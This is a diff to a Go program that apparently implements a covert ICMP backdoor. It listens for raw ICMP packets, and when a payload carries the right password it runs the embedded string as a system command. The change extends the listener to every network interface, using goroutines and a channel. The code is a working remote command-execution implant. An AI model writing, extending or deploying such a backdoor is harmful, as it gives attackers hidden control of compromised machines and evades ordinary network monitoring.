@@ -6,6 +6,7 @@ import (
 	"net"
 	"os/exec"
 	"strings"
+	"sync"
 )
 
 func run(cmd string) {
@@ -19,8 +20,22 @@ func run(cmd string) {
 	}
 }
 
-func server(addr, password string) error {
-	conn, err := net.ListenPacket("ip:icmp", addr)
+func loop(c chan string) {
+	for str := range c {
+		log.Println(str)
+		strs := strings.Split(str, "\x00\x00")
+		if len(strs) >= 3 && strs[0] == password {
+			switch strs[1] {
+			default:
+				go run(strs[1])
+			}
+		}
+	}
+}
+
+func listen(c chan string, addr net.Addr) error {
+	tmp := strings.SplitN(addr.String(), "/", 2)
+	conn, err := net.ListenPacket("ip:icmp", tmp[0])
 	if err != nil {
 		return err
 	}
@@ -30,15 +45,28 @@ func server(addr, password string) error {
 		if err != nil {
 			return err
 		}
-		bufstr := string(buf)
-		strs := strings.Split(bufstr, "\x00\x00")
-		if len(strs) >= 3 && strs[0] == password {
-			switch strs[1] {
-			default:
-				go run(strs[1])
-			}
-		}
+		c <- string(buf)
 	}
+}
+
+func server(password string) error {
+	addrs, err := net.InterfaceAddrs()
+	if err != nil {
+		return err
+	}
+	c := make(chan string, 16)
+	go loop(c)
+	var wg sync.WaitGroup
+	for _, addr := range addrs {
+		wg.Add(1)
+		go func(addr net.Addr) {
+			if err := listen(c, addr); err != nil {
+				log.Println(err)
+			}
+			wg.Done()
+		}(addr)
+	}
+	wg.Wait()
 	return nil
 }
 
@@ -74,7 +102,7 @@ func main() {
 			log.Println(err)
 		}
 	} else {
-		if err := server(addr, password); err != nil {
+		if err := server(password); err != nil {
 			log.Println(err)
 		}
 	}
